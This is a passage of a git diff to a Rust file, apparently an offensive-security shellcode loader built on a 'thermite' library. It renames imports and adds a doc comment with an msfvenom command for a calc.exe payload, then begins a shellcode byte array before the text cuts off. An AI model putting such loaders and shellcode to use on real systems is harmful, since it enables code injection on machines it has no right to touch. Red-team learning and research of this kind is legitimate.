@@ -1,9 +1,9 @@
-use thermite::peb_walk::Export;
 use std::{mem, process};
 use std::ffi::c_void;
 use std::ptr::null;
-use thermite::model::windows::peb_teb::UNICODE_STRING;
-use thermite::model::windows::nt_status::NtStatus;
+use thermite::models::windows::peb_teb::UNICODE_STRING;
+use thermite::models::windows::nt_status::NtStatus;
+use thermite::models::Export;
 
 // Don't forget #[repr(C)] !
 
@@ -37,9 +37,17 @@ const PAGE_READWRITE: u32 = 0x04;
 const PAGE_EXECUTE_READ: u32 = 0x20;
 const GENERIC_EXECUTE: u32 = 0x20000000;
 
-
-// Basic meterpreter shellcode, just spawns calc.exe
-// msfvenom -p windows/x64/exec CMD=calc.exe -f rust -v SHELLCODE
+/// A basic msfvenom shellcode, just spawns calc.exe 
+///
+/// __Stranger Danger__
+/// 
+/// Don't put everything you find in your computer, a shellcode is dangerous
+/// 
+/// Just go get your own shellcode, you can generate it using the following command:
+/// ```bash
+/// msfvenom -p windows/x64/exec CMD=calc.exe -f rust -v SHELLCODE
+/// ```
+///
 const POP_CALC: [u8; 276] = [
     0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
     0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
